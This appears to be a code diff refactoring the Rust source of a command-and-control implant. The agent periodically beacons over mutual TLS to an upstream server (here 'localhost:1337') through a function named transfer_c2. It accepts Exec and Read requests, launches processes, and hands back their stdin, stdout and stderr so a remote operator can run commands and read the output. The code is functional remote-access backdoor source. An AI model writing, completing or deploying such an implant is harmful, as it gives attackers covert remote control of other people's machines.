@@ -9,7 +9,7 @@ use std::{
     random::random,
     sync::{
         mpsc::{Receiver, SendError, Sender, TryRecvError},
-        Mutex,
+        Arc, Mutex,
     },
     thread,
     time::Duration,
@@ -27,32 +27,23 @@ use rustls::{
 type Handles = Mutex<HashMap<u64, Handle>>;
 
 fn main() {
-    let ca_cert = fs::read("./crypto/ca.crt").unwrap().leak();
-    let client_cert = fs::read("./crypto/client.crt").unwrap().leak();
-    let client_key = fs::read("./crypto/client.key").unwrap().leak();
-
-    let Ok((tx, rx)) = start_callback(
-        "lp",
-        Duration::from_secs(5),
-        "localhost:1337",
-        ca_cert,
-        client_cert,
-        client_key,
-    ) else {
-        return;
-    };
+    let ca_cert = fs::read("./crypto/ca.crt").unwrap();
+    let client_cert = fs::read("./crypto/client.crt").unwrap();
+    let client_key = fs::read("./crypto/client.key").unwrap();
+    let config = new_client_config(&ca_cert, &client_cert, &client_key).unwrap();
+    let (tx, rx) = start_callback("lp", Duration::from_secs(5), "localhost:1337", config).unwrap();
 
     let handles: Handles = Mutex::new(HashMap::new());
 
-    while let Ok(Request { session, seq, req }) = rx.recv() {
-        if let Err(e) = match req {
+    while let Ok(Request { sess, seq, req }) = rx.recv() {
+        if let Err(_e) = match req {
             request::RequestType::Exec(exec) => {
                 println!("Got Exec");
-                do_exec(exec, session, seq, &handles, tx.clone())
+                do_exec(exec, sess, seq, &handles, tx.clone())
             }
             request::RequestType::Read(read) => {
                 println!("Got Read");
-                do_read(read, session, seq, &handles, tx.clone())
+                do_read(read, sess, seq, &handles, tx.clone())
             }
             _ => {
                 println!("Unsupported type");
@@ -65,7 +56,7 @@ fn main() {
 }
 fn do_exec(
     exec: request::Exec,
-    session: u64,
+    sess: u64,
     seq: u64,
     handles: &Handles,
     tx: Sender<response::Response>,
@@ -112,7 +103,7 @@ fn do_exec(
                 let id: u64 = random(..);
                 handles.insert(id, stdout.into());
                 tx.send(Response {
-                    session,
+                    sess,
                     seq,
                     res: response::ResponseType::NewHandle(response::NewHandle {
                         note: "stdout".to_owned(),
@@ -125,7 +116,7 @@ fn do_exec(
                 let id: u64 = random(..);
                 handles.insert(id, stdin.into());
                 tx.send(Response {
-                    session,
+                    sess,
                     seq,
                     res: response::ResponseType::NewHandle(response::NewHandle {
                         note: "stdin".to_owned(),
@@ -138,7 +129,7 @@ fn do_exec(
                 let id: u64 = random(..);
                 handles.insert(id, stderr.into());
                 tx.send(Response {
-                    session,
+                    sess,
                     seq,
                     res: response::ResponseType::NewHandle(response::NewHandle {
                         note: "stderr".to_owned(),
@@ -155,7 +146,7 @@ fn do_exec(
 
 fn do_read(
     request::Read { id, ammount }: request::Read,
-    session: u64,
+    sess: u64,
     seq: u64,
     handles: &Mutex<HashMap<u64, Handle>>,
     tx: Sender<response::Response>,
@@ -163,7 +154,7 @@ fn do_read(
     let mut handles = handles.lock().unwrap();
     let Entry::Occupied(mut entry) = handles.entry(id) else {
         return tx.send(response::Response {
-            session,
+            sess,
             seq,
             res: response::ResponseType::HandleNotFound(id),
         });
@@ -171,20 +162,21 @@ fn do_read(
     let handle = entry.get_mut();
     match read_data(handle, ammount) {
         Ok(data) => tx.send(Response {
-            session,
+            sess,
             seq,
             res: response::ResponseType::Read(response::Read { data }),
         }),
         Err(error) => {
             entry.remove();
             tx.send(Response {
-                session,
+                sess,
                 seq,
                 res: response::ResponseType::Error(error),
             })
         }
     }
 }
+
 fn read_data(handle: &mut Handle, ammount: ReadAmount) -> Result<Vec<u8>, String> {
     match ammount {
         request::ReadAmount::End => {
@@ -270,9 +262,7 @@ fn start_callback(
     name: &'static str,
     sleep: Duration,
     upstream_addr: impl ToSocketAddrs + Send + 'static,
-    ca_cert: &'static [u8],
-    client_cert: &'static [u8],
-    client_key: &'static [u8],
+    config: Arc<ClientConfig>,
 ) -> Result<(Sender<response::Response>, Receiver<request::Request>), ConnectError> {
     let (res_tx, res_rx) = std::sync::mpsc::channel();
     let (req_tx, req_rx) = std::sync::mpsc::channel();
@@ -288,8 +278,8 @@ fn start_callback(
                     Err(TryRecvError::Disconnected) => break 'main,
                 }
             }
-            let mut ctx = setup_ctx(name, ca_cert, client_cert, client_key)?;
-            match transfer_c2(&mut ctx, responses, &upstream_addr) {
+            let config = config.clone();
+            match transfer_c2(name, config, responses, &upstream_addr) {
                 Ok(requests) => {
                     for req in requests {
                         if let Err(_) = req_tx.send(req) {
@@ -312,12 +302,11 @@ fn start_callback(
     Ok((res_tx, req_rx))
 }
 
-fn setup_ctx(
-    name: &'static str,
+fn new_client_config(
     ca_cert: &[u8],
     client_cert: &[u8],
     client_key: &[u8],
-) -> Result<ClientConnection, ConnectError> {
+) -> Result<Arc<ClientConfig>, ConnectError> {
     let mut store = RootCertStore::empty();
     store
         .add(CertificateDer::from_pem_slice(ca_cert).or(Err(ConnectError::BadPem))?)
@@ -329,22 +318,22 @@ fn setup_ctx(
             PrivateKeyDer::from_pem_slice(client_key).or(Err(ConnectError::BadPem))?,
         )
         .unwrap();
-    let name: ServerName = name.try_into().or(Err(ConnectError::InvalidServerName))?;
-    let ctx = ClientConnection::new(config.into(), name).or(Err(ConnectError::BadConfig))?;
-    Ok(ctx)
+    Ok(config.into())
+    // Ok(ctx)
 }
 
 fn transfer_c2(
-    ctx: &mut ClientConnection,
+    name: &'static str,
+    config: Arc<ClientConfig>,
     responses: Vec<response::Response>,
     upstream_addr: impl ToSocketAddrs,
 ) -> Result<Vec<request::Request>, io::Error> {
     let mut tcp_conn = std::net::TcpStream::connect(&upstream_addr)?;
     tcp_conn.set_read_timeout(Some(Duration::from_secs(10)))?;
     tcp_conn.set_write_timeout(Some(Duration::from_secs(10)))?;
-
-    let mut stream = rustls::Stream::new(ctx, &mut tcp_conn);
-
+    let name: ServerName = name.try_into().map_err(io::Error::other)?;
+    let mut ctx = ClientConnection::new(config, name).map_err(io::Error::other)?;
+    let mut stream = rustls::Stream::new(&mut ctx, &mut tcp_conn);
     bincode::encode_into_std_write(responses, &mut stream, bincode::config::standard())
         .map_err(io::Error::other)?;
     bincode::decode_from_std_read(&mut stream, bincode::config::standard())
